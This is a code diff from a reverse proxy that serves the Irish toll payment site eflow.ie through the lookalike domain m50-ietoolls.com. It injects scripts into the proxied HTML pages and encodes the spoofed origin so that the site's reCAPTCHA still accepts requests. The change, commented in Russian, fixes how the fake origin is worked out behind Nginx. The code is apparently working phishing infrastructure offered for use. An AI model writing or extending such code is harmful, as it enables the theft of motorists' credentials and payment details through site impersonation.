@@ -840,7 +840,8 @@ const proxyOptions = {
         if (contentType.includes('text/html')) {
           logger.info(`[SCRIPT INJECTION] Preparing to inject scripts for ${req.url}`);
             const targetOrigin = config.target.url; // https://eflow.ie
-            const proxyOrigin = `${req.protocol}://${proxyDomain}`;
+            // КРИТИЧНО: Используем proxyOriginFull вместо req.protocol (который может быть неправильным из-за Nginx)
+            const proxyOrigin = proxyOriginFull; // https://m50-ietoolls.com
             
             // Encode domains for reCAPTCHA 'co' parameter
             const targetBase64 = Buffer.from(`${targetOrigin}:443`).toString('base64').replace(/=/g, '.');
